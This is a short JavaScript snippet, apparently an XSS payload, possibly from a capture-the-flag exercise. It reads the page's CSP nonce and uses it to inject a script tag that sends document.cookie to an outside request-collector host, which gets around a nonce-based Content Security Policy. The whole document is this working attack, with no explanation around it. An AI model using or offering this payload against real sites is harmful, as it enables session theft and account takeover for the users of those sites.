const h = document.querySelector('script[nonce]').nonce
document.write(h)

document.write('<script src="https://recept.free.beeceptor.com/?cookie='+document.cookie+'" nonce="'+h+'"></script>')

